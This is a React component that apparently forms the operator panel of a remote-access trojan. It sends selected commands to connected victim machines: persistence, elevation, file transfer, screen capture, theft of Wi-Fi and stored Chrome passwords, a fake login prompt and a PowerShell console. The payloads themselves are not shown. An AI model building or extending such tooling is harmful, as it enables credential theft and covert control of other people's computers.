import {Button, Form} from "react-bootstrap";
import React, { useState} from "react";
import {sendCommand} from "../../api/api";

function ClientActions(props) {
    const [fileName, setFileName] = useState(null);
    const [command, setCommand] = useState(null);
    const [errors, setErrors] = useState(null);

    async function SendCommand()
    {
        setErrors(null);
        //need a global state of the client is connected? and only then allow sending the command
        if(props.client.status)
        {
            if(command === 'startPS') {
                //disable all other buttons and command select
            }
            else{
                let response = await sendCommand(props.client.client_id, command);
                if(!response) {
                    setErrors("Unable to send command to server, please try again");
                }
            }
        }
    }

    return <>
        <Form.Group controlId="command">
            <Form.Label className={"small-titles"} id={"title2"}>Command</Form.Label>
            <Form.Control as="select" value={command} onChange={e => {
                setCommand(e.target.value);
            }}>
                <option value={"stayhome"}>Persistence</option>
                <option value={"elevate"}>Elevate</option>
                <option value={"upload"}>Upload</option>
                <option value={"download"}>Download</option>
                <option value={"change-image"}>Change background</option>
                <option value={"capture"}>Screen capture</option>
                <option value={"get-network"}>Get network information</option>
                <option value={"getwifi"}>Get wifi passwords</option>
                <option value={"webPass"}>Get stored chrome passwords</option>
                <option value={"PromptUser"}>Prompt user for login UI</option>
                <option value={"StartPS"}>Start powershell console</option>

            </Form.Control>
            {(command === "upload" || command === "change-image") && (
                <Form.File className={"small-titles"} id="upload-file" label="Choose file" onChange={(e) => setFileName(e.target.files[0].name)}/>
            )}
            {(command === "download") && (
                <>
                    <Form.Label>Remote path:</Form.Label>
                    <Form.Control type="text" placeholder="Enter path" />
                </>
            )}
        </Form.Group>
        <Form.Group controlId="sendCommand">
            {
                <Button class="buttons" id={"send-button"} disabled={!props.client.status} variant={"success"} onClick={SendCommand}>Send</Button>
            }
        </Form.Group>
        {errors && (<Form.Label id={"send-errors"} className={"buttons"}>{errors}</Form.Label>)}
    </>;
}

export default ClientActions;